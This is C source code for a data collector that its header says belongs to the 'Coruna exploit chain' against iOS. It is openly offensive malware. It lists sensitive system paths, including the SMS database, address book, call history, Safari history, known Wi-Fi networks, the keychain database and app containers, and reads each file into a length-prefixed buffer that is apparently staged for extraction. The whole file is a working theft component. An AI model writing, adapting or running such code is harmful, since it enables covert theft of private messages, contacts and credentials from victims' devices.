// collector_v2.c - Multi-file reader for Coruna exploit chain
// Reads iOS system files, returns status code

extern int open(const char *path, int oflag, ...);
extern long long read(int fd, void *buf, long long count);
extern int close(int fd);

#define O_RDONLY 0

// Global data in __DATA segment (forces segment creation)
static volatile int _data_marker = 0xDEADBEEF;

// Result buffer
static unsigned char _result_buf[32768];
static int _result_len = 0;

// Target files with max read sizes
struct file_entry {
    const char *path;
    int max_size;
};

static const struct file_entry _targets[] = {
    { "/etc/hosts",                                              1024 },
    { "/var/mobile/Library/SMS/sms.db",                         8192 },
    { "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",    8192 },
    { "/var/mobile/Library/CallHistoryDB/CallHistory.storedata", 8192 },
    { "/var/mobile/Library/Safari/History.db",                   8192 },
    { "/var/mobile/Library/WiFi/com.apple.wifi.known-networks.plist", 2048 },
    { "/var/Keychains/keychain-2.db",                            8192 },
    { "/var/mobile/Library/Preferences/com.apple.MobileSMS.plist", 1024 },
    { "/var/mobile/Library/Preferences/com.apple.springboard.plist", 1024 },
    { "/var/mobile/Containers/Data/Application",                   256 },
};

#define NUM_TARGETS (sizeof(_targets) / sizeof(_targets[0]))

// Entry point: reads all files, returns (files_read << 16) | result_size
int process(void *arg) {
    int offset = 4;  // reserve 4 bytes for file_count
    int files_read = 0;
    
    // Clear buffer
    for (int i = 0; i < 32768; i++) _result_buf[i] = 0;
    
    for (int i = 0; i < (int)NUM_TARGETS; i++) {
        if (offset + 8 >= 32760) break;
        
        int fd = open(_targets[i].path, O_RDONLY);
        if (fd < 0) {
            // Mark as failed: length = 0xFFFFFFFF
            _result_buf[offset]   = 0xFF;
            _result_buf[offset+1] = 0xFF;
            _result_buf[offset+2] = 0xFF;
            _result_buf[offset+3] = 0xFF;
            offset += 4;
            continue;
        }
        
        int remaining = 32760 - offset - 4;
        int max = _targets[i].max_size < remaining ? _targets[i].max_size : remaining;
        long long n = read(fd, _result_buf + offset + 4, max);
        close(fd);
        
        if (n > 0) {
            int bytes = (int)n;
            _result_buf[offset]   = (bytes >> 24) & 0xFF;
            _result_buf[offset+1] = (bytes >> 16) & 0xFF;
            _result_buf[offset+2] = (bytes >> 8) & 0xFF;
            _result_buf[offset+3] = bytes & 0xFF;
            offset += 4 + bytes;
            files_read++;
        } else {
            _result_buf[offset]   = 0xFF;
            _result_buf[offset+1] = 0xFF;
            _result_buf[offset+2] = 0xFF;
            _result_buf[offset+3] = 0xFE;
            offset += 4;
        }
    }
    
    // Write header
    _result_buf[0] = (files_read >> 24) & 0xFF;
    _result_buf[1] = (files_read >> 16) & 0xFF;
    _result_buf[2] = (files_read >> 8) & 0xFF;
    _result_buf[3] = files_read & 0xFF;
    
    _result_len = offset;
    
    // Return: files_read in high 16 bits, total_size in low 16 bits
    return (files_read << 16) | (offset & 0xFFFF);
}